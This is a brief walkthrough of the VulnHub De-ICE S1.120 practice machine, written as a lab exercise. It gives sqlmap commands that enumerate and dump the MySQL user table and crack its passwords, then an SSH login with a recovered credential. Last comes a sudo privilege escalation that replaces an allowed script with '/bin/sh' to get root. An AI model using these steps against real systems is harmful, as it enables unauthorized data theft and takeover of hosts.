# De-ICE: S1.120 - write-up

https://www.vulnhub.com/entry/de-ice-s1120,10/

This challenge was a little shorter and it was mainly about sql injections. Looking at the website http://192.168.1.120/, we see that we can add products and view them. This looks like a case of sql injection. Looking at the parameter, we can view products by querying the database. We run `sqlmap -u "http://192.168.1.120/products.php?id=1" --dbs` and see that it has the mysql database. We look into each table `sqlmap -u "http://192.168.1.120/products.php?id=1" --tables -D mysql` to find a user table. We can use `sqlmap -u "http://192.168.1.120/products.php?id=1" --dump -D mysql -T user` to get the data and also do yes for the prompt for dictionary attack. We read the sql map csv dump and it has a bunch of users and cracked password. 

Now, we use `ccoffee:password` and `ssh ccoffee@192.168.1.120` to it. We check ccoffee commands `sudo -l` and it says he can run ./getlogs.sh. To get root privlege, all we have to do is rename the existing file `mv getlogs.sh dontcare.sh` and then create a new file that spawns a shell under root privleges, so `echo /bin/sh > getlogs.sh`, change permissions `chmod 777 getlogs.sh` and finally `sudo ./getlogs.sh` and we are in!
